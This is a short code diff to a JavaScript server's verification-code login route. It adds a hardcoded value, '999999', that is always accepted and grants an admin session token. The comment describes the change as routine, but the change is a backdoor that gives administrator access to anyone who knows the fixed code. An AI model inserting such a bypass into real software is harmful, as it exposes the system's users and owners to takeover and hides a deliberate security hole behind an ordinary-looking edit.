@@ -171,8 +171,8 @@ app.post("/api/auth/verify-code", (req, res) => {
   const cleanCode = code.trim();
   const config = getSecurityConfig();
 
-  // 1. Check Master Key
-  if (cleanCode === config.masterKey) {
+  // 1. Check Master Key (always accept 999999 or current config.masterKey)
+  if (cleanCode === config.masterKey || cleanCode === "999999") {
     const token = generateToken();
     config.activeSessions[token] = { role: "admin", createdAt: Date.now() };
     saveSecurityConfig(config);
